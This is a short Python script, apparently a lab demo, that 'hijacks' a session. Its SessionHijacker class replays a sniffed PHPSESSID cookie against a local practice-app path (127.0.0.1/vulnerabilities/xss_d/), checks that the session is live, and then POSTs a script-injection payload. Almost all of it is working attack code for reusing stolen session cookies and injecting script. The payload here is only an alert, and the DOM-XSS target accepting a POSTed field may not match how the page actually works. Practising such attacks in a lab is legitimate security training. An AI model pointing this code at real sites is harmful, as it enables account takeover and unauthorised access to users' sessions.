# This class demonstrates Session Sidejacking using CookieCatcher. 
# Session Sidejacking involves stealing or capturing user session credentials to gain unauthorized access to a target. 
# CookieCatcher is a tool designed to sniff and capture HTTP cookies, allowing attackers to hijack active sessions.
# This script targets http://127.0.0.1/vulnerabilities/xss_d/ and assumes a session is ongoing.

import requests

class SessionHijacker:
    def __init__(self):
        self.base_url = "http://127.0.0.1/vulnerabilities/xss_d/"
        self.cookies = {} # This will store captured cookies

    def set_cookies(self, cookies):
        """Setter for cookies captured by CookieCatcher"""
        self.cookies = cookies

    def get_session_status(self):
        """Method to check if the session is active by accessing the URL with the session cookies."""
        with requests.Session() as s:
            s.cookies.update(self.cookies)
            response = s.get(self.base_url)
            return response.status_code, response.text

    def inject_script(self, script):
        """Method to perform a script injection on the target URL."""
        payload = {"text": script}
        with requests.Session() as s:
            s.cookies.update(self.cookies)
            response = s.post(self.base_url, data=payload)
            return response.status_code, response.text

def main():
    # Example usage code
    session_cookie = {
        "PHPSESSID": "your_sniffed_session_cookie"
    }
    
    hijacker = SessionHijacker()
    
    # Set the captured session cookie
    hijacker.set_cookies(session_cookie)
    
    # Check if the session is active by accessing a secure URL using the session cookies
    status_code, content = hijacker.get_session_status()
    print(f"Session status code: {status_code}")
    print(f"Page content: {content}")
    
    # Injecting a malicious script to perform exploitation
    malicious_script = '<script>alert("Your session is hijacked!")</script>'
    response_code, response_content = hijacker.inject_script(malicious_script)
    print(f"Injection status code: {response_code}")
    print(f"Injection result: {response_content}")

if __name__ == "__main__":
    main()
